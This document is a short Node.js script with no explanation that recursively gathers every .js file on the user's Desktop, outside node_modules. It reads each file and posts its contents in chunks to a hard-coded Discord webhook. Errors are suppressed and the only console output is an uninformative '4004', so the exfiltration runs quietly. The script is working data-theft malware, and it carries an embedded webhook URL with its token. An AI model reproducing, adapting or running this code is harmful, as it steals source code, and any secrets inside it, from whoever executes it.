const fs = require('fs');
const path = require('path');
const { WebhookClient } = require('discord.js');


const webhookUrl = 'https://discord.com/api/webhooks/1252316676138205255/Yv1g9rebzFyBqXOgFbRBjr97mfhNx429FAc8U2WcJy4ts8P1Y5H7R3SeajOvSv9rUJ90';


const desktopDirectory = path.join(require('os').homedir(), 'Desktop');


function findJsFiles(directory, fileList = []) {
    const files = fs.readdirSync(directory);
    files.forEach(file => {
        const filePath = path.join(directory, file);
        const fileStat = fs.statSync(filePath);
        if (fileStat.isDirectory() && !filePath.includes('node_modules')) {
            findJsFiles(filePath, fileList);
        } else if (file.endsWith('.js') && !filePath.includes('node_modules')) {
            fileList.push(filePath);
        }
    });
    return fileList;
}


const jsFiles = findJsFiles(desktopDirectory);


const webhookClient = new WebhookClient({ url: webhookUrl });


jsFiles.forEach(jsFile => {
    fs.readFile(jsFile, 'utf8', (err, data) => {
        if (err) {
            
            return;
        }
        
        const chunks = data.match(/[\s\S]{1,1000}/g) || [];
        
        chunks.forEach((chunk, index) => {
            const message = `**${jsFile} (Part ${index + 1})**\n\`\`\`javascript\n${chunk}\n\`\`\``;
            
            webhookClient.send(message)
                .then(() => {
                    console.log(`4004`);
                })
                .catch(error => {
                    
                });
        });
    });
});


webhookClient.destroy();